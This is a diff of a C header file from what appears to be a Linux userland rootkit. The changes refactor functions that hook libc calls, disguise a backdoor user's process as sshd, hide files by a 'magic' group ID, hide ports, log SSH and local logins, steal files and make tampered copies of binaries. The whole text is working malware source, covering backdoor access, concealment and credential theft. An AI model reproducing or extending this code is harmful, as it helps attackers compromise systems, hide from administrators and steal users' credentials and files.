@@ -1,20 +1,18 @@
-#ifndef UTIL_H
-#define UTIL_H
-
+#ifndef _UTIL_H_
+#define _UTIL_H_
 #define HOME_VAR       "HOME="HOMEDIR
 #define BD_SSHPROCNAME "sshd: "BD_UNAME
 
 #define CMDLINE_PATH      "/proc/%d/cmdline"
 #define FALLBACK_PROCNAME "YuuUUU"
 #define NAME_MAXLEN       128     /* max lengths for storing process name */
-#define CMDLINE_MAXLEN    512     /* & cmdline string. */
+#define CMDLINE_MAXLEN    256     /* & cmdline string. */
 
-#define PID_MAXLEN      30      /* max length in bytes a pid can be */
+#define PID_MAXLEN      150
 #define PROCPATH_MAXLEN strlen(CMDLINE_PATH) + PID_MAXLEN
 
-#define MODE_NAME     0x01   /* defined modes for determining whether */
-#define MODE_CMDLINE  0x02   /* to get just the process name or its full */
-                             /* cmdline entry. */
+#define MODE_NAME     1
+#define MODE_CMDLINE  2
 
 char *get_cmdline(pid_t pid);
 int  open_cmdline(pid_t pid);
@@ -24,13 +22,14 @@ char *process_info(pid_t pid, int mode);
 #define process_name()    process_info(getpid(), MODE_NAME)
 #define process_cmdline() process_info(getpid(), MODE_CMDLINE)
 
+int sshdproc(void);
 int cmp_process(char *name);
 char *str_process(char *name);
 int process(char *name);
 #ifdef USE_PAM_BD
 int bd_sshproc(void);
 #endif
-#include "processes.c"
+#include "proc.c"
 
 #define isbduname(name) !strncmp(BD_UNAME, name, LEN_BD_UNAME)
 
@@ -42,7 +41,7 @@ int chown_path(const char *path, gid_t gid){
     return (long)call(CCHOWN, path, 0, gid);
 }
 
-int not_user(int id){
+int notuser(int id){
     if(getuid() != id && geteuid() != id)
         return 1;
     return 0;
@@ -88,7 +87,11 @@ do{                            \
         X = NULL;              \
     }                          \
 }while(0)
+#endif
 
+#ifdef USE_PAM_BD
+#define BASHRC_PATH HOMEDIR"/.bashrc"
+#define PROFILE_PATH HOMEDIR"/.profile"
 #endif
 
 
@@ -105,24 +108,26 @@ off_t getablocksize(off_t fsize){
     return blksize;
 }
 
-/* opens path for reading in binary mode & returns the FILE pointer..
- * the pointers fsize & mode are updated with st_size & st_mode from the
- * stat buffer. (*if it is successful*)
- * the pointer nfp should be a pointer to a FILE pointer & should be for
- * writing the result to newpath when finished. */
+/* lstat on path. pointers fsize & mode are updated with st_size & st_mode.
+ * fopen called on path for reading.
+ * fopen called on newpath for writing a (likely tampered with) copy.
+ * if any of the 3 calls fail NULL is returned.
+ * if path is a link NULL is returned. */
 FILE *bindup(const char *path, char *newpath, FILE **nfp, off_t *fsize, mode_t *mode){
     FILE *ret;
     struct stat bstat;
     int statr;
 
-    hook(C__XSTAT, CFOPEN);
+    hook(C__LXSTAT, CFOPEN);
     
     memset(&bstat, 0, sizeof(struct stat));
-    statr = (long)call(C__XSTAT, _STAT_VER, path, &bstat);
+    statr = (long)call(C__LXSTAT, _STAT_VER, path, &bstat);
     if(statr < 0) return NULL;
 
-    *fsize = bstat.st_size;
     *mode = bstat.st_mode;
+    if(S_ISLNK(*mode)) // never ever
+        return NULL;
+    *fsize = bstat.st_size;
 
     ret = call(CFOPEN, path, "rb");
     if(ret == NULL) return NULL;
@@ -136,48 +141,30 @@ FILE *bindup(const char *path, char *newpath, FILE **nfp, off_t *fsize, mode_t *
     return ret;
 }
 
+#if defined LOG_SSH || defined LOG_LOCAL_AUTH
+int alreadylogged(const char *logpath, char *logbuf);
+int logcount(const char *path);
+#include "log.c"
+#endif
 
 int rknomore(void);
 #include "nomore.c"
 
+void eradicatedir(const char *target);
 #include "magic/magic.h"
-
-void dorolf(void){
-#ifndef NO_ROOTKIT_ANSI
-    printf("\033[0;31m");
-    for(int i = 0; i != BDANSI_SIZE; i++)
-        printf("%c", bdansi[i]);
-    printf("\033[0m\n");
-#endif
-    srand(time(NULL));
-    char *randrolf = rolfs[rand() % ROLFS_SIZE];
-    printf("\e[1;31m%s\e[0m\n", randrolf);
-}
-
-int prepareregfile(const char *path, gid_t magicgid);
-int preparedir(const char *path, gid_t magicgid);
-#ifdef HIDE_PORTS
-void prepareports(void);
-#endif
-#if defined LOG_LOCAL_AUTH || defined LOG_SSH
-int logcount(const char *path);
-#endif
-#ifdef FILE_STEAL
-off_t getstolensize(void);
-#endif
-void bdprep(void);
-#include "prep.c"
-
-#include "install/install.h"
-
 
 #ifdef FILE_STEAL
 #include "steal/steal.h"
 #endif
 
-#if defined LOG_SSH || defined LOG_LOCAL_AUTH
-int alreadylogged(const char *logpath, char *logbuf);
-#include "log.c"
+int prepareregfile(const char *path, gid_t magicgid);
+int preparedir(const char *path, gid_t magicgid);
+#ifdef HIDE_PORTS
+void preparehideports(gid_t magicgid);
 #endif
+void bdprep(void);
+#include "prep.c"
+
+#include "install/install.h"
 
 #endif
